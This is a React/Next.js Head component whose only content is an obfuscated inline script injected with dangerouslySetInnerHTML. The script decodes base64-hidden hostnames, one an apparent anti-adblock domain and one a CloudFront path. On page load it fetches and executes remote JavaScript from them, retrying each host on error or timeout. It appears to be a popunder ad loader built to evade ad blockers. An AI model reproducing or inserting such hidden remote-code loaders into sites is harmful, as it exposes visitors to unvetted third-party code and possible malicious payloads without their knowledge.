export default function Head() {
  return (
    <>
      <script
        type="text/javascript"
        dangerouslySetInnerHTML={{
          __html: `
(function(){var r=window,z="ab4e8d66390f6a5e1b1c6f192533f319",n=[["siteId",148-885-597+5271094],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],x=["d3d3LmFudGlhZGJsb2Nrc3lzdGVtcy5jb20vbGpzbWVkaWF0YWdzLm1pbi5jc3M=","ZDNjb2Q4MHRobjdxbmQuY2xvdWRmcm9udC5uZXQvT1V5ZS9ldHlwZWQubWluLmpz"],a=-1,d,y,g=function(){clearTimeout(y);a++;if(x[a]&&!(1794601685000<(new Date).getTime()&&1<a)){d=r.document.createElement("script");d.type="text/javascript";d.async=!0;var q=r.document.getElementsByTagName("script")[0];d.src="https://"+atob(x[a]);d.crossOrigin="anonymous";d.onerror=g;d.onload=function(){clearTimeout(y);r[z.slice(0,16)+z.slice(0,16)]||g()};y=setTimeout(g,5E3);q.parentNode.insertBefore(d,q)}};if(!r[z]){try{Object.freeze(r[z]=n)}catch(e){}g()}})();
          `,
        }}
      />
    </>
  );
}
